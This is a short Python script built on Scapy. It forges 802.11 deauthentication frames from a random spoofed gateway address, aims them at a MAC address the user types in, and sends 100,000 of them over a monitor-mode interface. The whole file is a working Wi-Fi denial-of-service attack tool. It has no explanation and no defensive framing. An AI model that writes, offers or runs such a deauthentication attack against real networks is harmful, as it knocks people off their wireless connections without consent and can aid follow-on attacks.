from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

targer_mac = input("mac address: ")
gateway_mac = RandMAC()

dot11 = Dot11(type=8, subtype=12 ,addr1=targer_mac, addr2=gateway_mac, addr3=gateway_mac)

packet = RadioTap()/dot11/Dot11Deauth(reason=7)
sendp(packet, inter=0.1, count=100000, iface="wlan0mon", verbose=1)